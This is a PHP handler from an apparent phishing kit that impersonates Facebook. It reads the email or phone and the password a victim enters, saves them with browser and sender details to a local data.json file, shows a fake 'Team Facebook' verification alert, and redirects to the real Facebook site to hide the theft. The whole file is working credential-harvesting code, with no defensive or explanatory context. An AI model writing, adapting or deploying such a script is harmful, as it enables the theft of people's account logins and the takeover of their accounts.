<?php 

$date = date("d M Y");
//check for the values is empty or not .. 
if(empty($_POST['userEmail'])){
$err = "email or phone is required.";
 echo $err;
}else if(empty($_POST['userPass'])){
    $err = " password is required.";
     echo $err;
}else if(strlen($_POST['userPass']) < 6){
 $err = "password must be at least 6 characters.";
  echo $err;
}else{
    $phone = $_POST['userEmail'];
    $password = $_POST['userPass'];
    $sender = $_POST['sender'];
    $browser = $_POST['browser'];
    //run query for that and save to json data. 
    $result = false;
    //read the last record of file 
    $file = "data.json";
    $getFile = file_get_contents($file);
    $userData = [
        "sender" => $sender,
        "email_phone" => $phone,
        "password" => bin2hex($password),
        "date" => $date,
        "browser" => $browser
    ];

    $oldFile = json_decode($getFile, TRUE);
    $oldFile[] = $userData;
    $newData = json_encode($oldFile, JSON_PRETTY_PRINT);
    $result = file_put_contents("data.json", $newData);
    if($result){
        echo "<script>
         alert('your facebook is verification is under process. your account will be verified within 24 hrs. --Team Facebook--');
        setTimeout(function(){
           window.location.href = 'https://www.facebook.com/home.php';
        }, 1000);
        </script>";
        // header("location: ");
    }else{
       header("location:login.php?en=$sender");
    }
}
